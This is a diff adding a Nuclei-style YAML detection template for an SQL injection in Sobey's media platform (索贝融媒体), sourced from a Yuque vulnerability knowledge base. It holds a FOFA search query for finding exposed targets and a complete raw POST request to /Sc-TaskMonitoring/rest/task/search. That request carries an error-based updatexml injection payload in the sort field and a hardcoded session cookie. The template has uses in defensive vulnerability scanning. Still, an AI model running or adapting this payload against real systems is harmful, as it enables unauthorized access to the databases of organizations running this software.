@@ -1,0 +1,36 @@
+id: poc-rkl7bpo17yetywbp
+info:
+  name: 索贝融媒体search存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkl7bpo17yetywbp'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rkl7bpo17yetywbp
+    fofa: body="/Sc-TaskMonitoring/"
+http:
+- raw:
+  - 'POST /Sc-TaskMonitoring/rest/task/search HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 147
+
+    Content-Type: application/json;charset=UTF-8
+
+    Cookie: token=5ab95532238da1b7d9eb20de7ecef90e; siteCode=S1
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    {"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1 and(updatexml(1,concat(0x7e,(select md5(123456))),1))","desc":true}}'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
